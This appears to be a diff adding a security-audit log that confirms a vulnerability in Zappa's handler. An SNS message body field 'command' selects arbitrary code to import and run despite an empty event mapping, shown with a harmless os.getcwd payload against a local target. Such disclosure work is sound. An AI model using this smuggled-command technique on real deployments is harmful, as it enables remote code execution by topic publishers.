@@ -1,0 +1,10 @@
+==========================================================================
+VULN-030: SNS message-body command overrides AWS_EVENT_MAPPING
+target : http://localhost:22571
+[INFO] exercising: zappa/handler.py:645-649 (SNS body command) -> import_and_get_function
+==========================================================================
+[STEP] publishing an SNS record with Message body {"command": "os.getcwd"} (topic is UNmapped)
+[INFO] handler returned = '/app/_harness'
+[PROOF] the SNS message body selected and ran os.getcwd()='/app/_harness' despite an empty AWS_EVENT_MAPPING — a topic publisher, not just a lambda:InvokeFunction holder, controls which code executes (feeds the VULN-002 sink).
+[OK] exploit confirmed — SNS body `command` overrides the admin mapping
+==> VULN-030: CONFIRMED — SNS message-body command -> import+invoke (topic-publisher RCE)
